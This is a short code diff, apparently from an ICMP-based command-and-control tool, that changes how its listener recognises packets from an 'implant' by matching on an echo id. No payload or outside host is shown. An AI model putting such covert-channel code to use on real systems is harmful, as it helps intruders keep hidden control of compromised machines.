@@ -78,9 +78,8 @@ ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
 }
 
 // check if we got an actual connection from our implant
-/* TODO: dynamic id */
 int check_magic_byte(struct icmphdr *icmp) {
-    if (icmp->code == 8 && icmp->un.echo.id == RAND_ID) {
+    if (icmp->un.echo.id == RAND_ID) {
         return 1;
     }
     return 0;
